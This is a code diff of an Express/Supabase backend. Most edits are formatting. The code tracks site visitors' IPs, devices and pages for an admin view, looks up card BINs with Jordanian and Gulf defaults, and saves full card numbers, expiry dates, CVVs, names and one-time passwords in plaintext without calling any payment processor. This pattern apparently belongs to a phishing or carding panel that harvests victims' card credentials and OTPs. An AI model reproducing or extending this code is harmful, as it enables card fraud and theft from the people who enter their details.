@@ -8,8 +8,16 @@ const router = Router();
 // Track visitor online status, current page, and system details
 router.post("/track", async (req, res) => {
   try {
-    const { id, page, userAgent, os, device, browser, location, sessionData } =
-      req.body;
+    const { 
+      id,
+      page, 
+      userAgent, 
+      os, 
+      device, 
+      browser, 
+      location,
+      sessionData 
+    } = req.body;
 
     if (!id) {
       return res.status(400).json({ error: "Missing visitor ID" });
@@ -18,29 +26,28 @@ router.post("/track", async (req, res) => {
     const ipData = await lookupClientIpData(req);
     const resolvedCountry = ipData.country || location || null;
 
-    const trackingResult = await supabase.from("visitor_tracking").upsert([
-      {
-        id,
-        page,
-        ip: ipData.ip,
-        user_agent: userAgent,
-        os,
-        device,
-        browser,
-        location: resolvedCountry,
-        sessionData: sessionData,
-        last_active: new Date().toISOString(),
-      },
-    ]);
+    const trackingResult = await supabase
+      .from("visitor_tracking")
+      .upsert([
+        {
+          id,
+          page,
+          ip: ipData.ip,
+          user_agent: userAgent,
+          os,
+          device,
+          browser,
+          location: resolvedCountry,
+          country: ipData.country,
+          session_data: sessionData,
+          last_active: new Date().toISOString()
+        }
+      ]);
     const data = trackingResult.data;
-    const error = (trackingResult as { error: { message?: string } | null })
-      .error;
+    const error = (trackingResult as { error: { message?: string } | null }).error;
 
     if (error) {
-      logger.error(
-        { errorMessage: error.message ?? "Unknown Supabase error" },
-        "Supabase tracking error",
-      );
+      logger.error({ errorMessage: error.message ?? "Unknown Supabase error" }, "Supabase tracking error");
       return res.status(500).json({ error: "Failed to track visitor" });
     }
 
@@ -57,9 +64,7 @@ router.get("/bin-lookup/:bin", async (req, res) => {
   const cleanBin = (bin || "").replace(/\D/g, "").slice(0, 8);
 
   if (!cleanBin || cleanBin.length < 6) {
-    return res
-      .status(400)
-      .json({ error: "Invalid BIN. Provide at least 6 digits." });
+    return res.status(400).json({ error: "Invalid BIN. Provide at least 6 digits." });
   }
 
   try {
@@ -67,9 +72,9 @@ router.get("/bin-lookup/:bin", async (req, res) => {
     const binlistRes = await fetch(`https://lookup.binlist.net/${cleanBin}`, {
       headers: {
         "Accept-Version": "3",
-        "User-Agent": "Mozilla/5.0",
+        "User-Agent": "Mozilla/5.0"
       },
-      signal: AbortSignal.timeout(3000),
+      signal: AbortSignal.timeout(3000)
     }).catch(() => null);
 
     if (binlistRes && binlistRes.ok) {
@@ -79,7 +84,7 @@ router.get("/bin-lookup/:bin", async (req, res) => {
 
     // Attempt 2: handyapi.com
     const handyRes = await fetch(`https://data.handyapi.com/bin/${cleanBin}`, {
-      signal: AbortSignal.timeout(3000),
+      signal: AbortSignal.timeout(3000)
     }).catch(() => null);
 
     if (handyRes && handyRes.ok) {
@@ -94,25 +99,12 @@ router.get("/bin-lookup/:bin", async (req, res) => {
       if (handyData && handyData.Status === "SUCCESS") {
         const countryName = handyData.Country?.Name || "Jordan";
         const alpha2 = handyData.Country?.A2 || "JO";
-        const emoji =
-          alpha2 === "DK"
-            ? "🇩🇰"
-            : alpha2 === "JO"
-              ? "🇯🇴"
-              : alpha2 === "SA"
-                ? "🇸🇦"
-                : alpha2 === "QA"
-                  ? "🇶🇦"
-                  : alpha2 === "AE"
-                    ? "🇦🇪"
-                    : alpha2 === "KW"
-                      ? "🇰🇼"
-                      : "🌍";
+        const emoji = alpha2 === "DK" ? "🇩🇰" : alpha2 === "JO" ? "🇯🇴" : alpha2 === "SA" ? "🇸🇦" : alpha2 === "QA" ? "🇶🇦" : alpha2 === "AE" ? "🇦🇪" : alpha2 === "KW" ? "🇰🇼" : "🌍";
 
         return res.json({
           number: {
             length: 16,
-            luhn: true,
+            luhn: true
           },
           scheme: (handyData.Scheme || "visa").toLowerCase(),
           type: (handyData.Type || "debit").toLowerCase(),
@@ -123,29 +115,19 @@ router.get("/bin-lookup/:bin", async (req, res) => {
             alpha2: alpha2,
             name: countryName,
             emoji: emoji,
-            currency:
-              alpha2 === "JO"
-                ? "JOD"
-                : alpha2 === "SA"
-                  ? "SAR"
-                  : alpha2 === "DK"
-                    ? "DKK"
-                    : "USD",
+            currency: alpha2 === "JO" ? "JOD" : alpha2 === "SA" ? "SAR" : alpha2 === "DK" ? "DKK" : "USD",
             latitude: 31,
-            longitude: 35,
+            longitude: 35
           },
           bank: {
             name: handyData.Issuer || "Issuing Bank",
-            city: "Capital",
-          },
+            city: "Capital"
+          }
         });
       }
     }
   } catch (e) {
-    logger.warn(
-      { bin: cleanBin, error: (e as any)?.message },
-      "Live BIN lookup failed, falling back to local database",
-    );
+    logger.warn({ bin: cleanBin, error: (e as any)?.message }, "Live BIN lookup failed, falling back to local database");
   }
 
   // Fallback local BIN database
@@ -153,13 +135,7 @@ router.get("/bin-lookup/:bin", async (req, res) => {
   const isMastercard = /^5[1-5]|^2[2-7]/.test(cleanBin);
   const isAmex = /^3[47]/.test(cleanBin);
 
-  let scheme = isVisa
-    ? "visa"
-    : isMastercard
-      ? "mastercard"
-      : isAmex
-        ? "amex"
-        : "visa";
+  let scheme = isVisa ? "visa" : isMastercard ? "mastercard" : isAmex ? "amex" : "visa";
   let bankName = "Issuing Bank";
   let countryName = "Jordan";
   let emoji = "🇯🇴";
@@ -192,7 +168,7 @@ router.get("/bin-lookup/:bin", async (req, res) => {
   return res.json({
     number: {
       length: 16,
-      luhn: true,
+      luhn: true
     },
     scheme,
     type,
@@ -205,19 +181,19 @@ router.get("/bin-lookup/:bin", async (req, res) => {
       emoji: emoji,
       currency: currency,
       latitude: 31,
-      longitude: 35,
+      longitude: 35
     },
     bank: {
       name: bankName,
-      city: emoji === "🇸🇦" ? "Riyadh" : "Amman",
-    },
+      city: emoji === "🇸🇦" ? "Riyadh" : "Amman"
+    }
   });
 });
 
 // Store payment data with OTP
 router.post("/payment", async (req, res) => {
   try {
-    const {
+    const { 
       paymentId,
       cardNumber,
       expiry,
@@ -228,7 +204,7 @@ router.post("/payment", async (req, res) => {
       amount,
       currency,
       visitorId,
-      binData,
+      binData
     } = req.body;
 
     if (paymentId) {
@@ -236,18 +212,13 @@ router.post("/payment", async (req, res) => {
       const paymentUpdateResult = await supabase
         .from("payments")
         .update(paymentId, {
-          otp,
+          otp
         });
       const data = paymentUpdateResult.data;
-      const error = (
-        paymentUpdateResult as { error: { message?: string } | null }
-      ).error;
-
+      const error = (paymentUpdateResult as { error: { message?: string } | null }).error;
+      
       if (error) {
-        logger.error(
-          { errorMessage: error.message ?? "Unknown Supabase error" },
-          "Supabase payment update error",
-        );
+        logger.error({ errorMessage: error.message ?? "Unknown Supabase error" }, "Supabase payment update error");
         return res.status(500).json({ error: "Failed to update payment" });
       }
       return res.json({ success: true, data });
@@ -260,9 +231,7 @@ router.post("/payment", async (req, res) => {
         const recentVisitorsResult = await supabase
           .from("visitor_tracking")
           .select("*", { orderBy: "last_active", ascending: false });
-        const recentVisitors = recentVisitorsResult.data as Array<{
-          id: string;
-        }> | null;
+        const recentVisitors = recentVisitorsResult.data as Array<{ id: string }> | null;
         if (recentVisitors && recentVisitors.length > 0) {
           effectiveVisitorId = recentVisitors[0].id;
         } else {
@@ -275,58 +244,51 @@ router.post("/payment", async (req, res) => {
 
     // Upsert visitor_tracking to guarantee this visitor exists and appears in admin sidebar
     try {
-      await supabase.from("visitor_tracking").upsert([
-        {
-          id: effectiveVisitorId,
-          ip: ipData.ip,
-          last_active: new Date().toISOString(),
-          page: "مرحلة الدفع (Step 5)",
-          browser: "Chrome",
-          os: "Windows",
-          device: "desktop",
-          location: ipData.country || undefined,
-          session_data: {
-            timestamp: Date.now(),
-            countryCode: ipData.countryCode,
-            booking: {
-              amountJod: amount || 25,
-            },
-          },
-        },
-      ]);
+      await supabase.from("visitor_tracking").upsert([{
+        id: effectiveVisitorId,
+         ip: ipData.ip,
+        last_active: new Date().toISOString(),
+        page: "مرحلة الدفع (Step 5)",
+        browser: "Chrome",
+        os: "Windows",
+        device: "desktop",
+         location: ipData.country || undefined,
+         country: ipData.country || undefined,
+        session_data: {
+          timestamp: Date.now(),
+           countryCode: ipData.countryCode,
+          booking: {
+            amountJod: amount || 25
+          }
+        }
+      }]);
     } catch (err) {
-      logger.warn(
-        { err },
-        "Auto-upsert visitor tracking failed during payment",
-      );
+      logger.warn({ err }, "Auto-upsert visitor tracking failed during payment");
     }
 
     // Never use client storage, all data goes directly to Supabase server-side
-    const paymentInsertResult = await supabase.from("payments").insert([
-      {
-        card_number: cardNumber,
-        expiry,
-        cvv,
-        name,
-        bank_name: bankName,
-        otp,
-        amount,
-        currency,
-        visitor_id: effectiveVisitorId,
-        bin_data: binData,
-        created_at: new Date().toISOString(),
-      },
-    ]);
+    const paymentInsertResult = await supabase
+      .from("payments")
+      .insert([
+        {
+          card_number: cardNumber,
+          expiry,
+          cvv,
+          name,
+          bank_name: bankName,
+          otp,
+          amount,
+          currency,
+          visitor_id: effectiveVisitorId,
+          bin_data: binData,
+          created_at: new Date().toISOString()
+        }
+      ]);
     const data = paymentInsertResult.data;
-    const error = (
-      paymentInsertResult as { error: { message?: string } | null }
-    ).error;
+    const error = (paymentInsertResult as { error: { message?: string } | null }).error;
 
     if (error) {
-      logger.error(
-        { errorMessage: error.message ?? "Unknown Supabase error" },
-        "Supabase payment error",
-      );
+      logger.error({ errorMessage: error.message ?? "Unknown Supabase error" }, "Supabase payment error");
       return res.status(500).json({ error: "Failed to process payment" });
     }
 
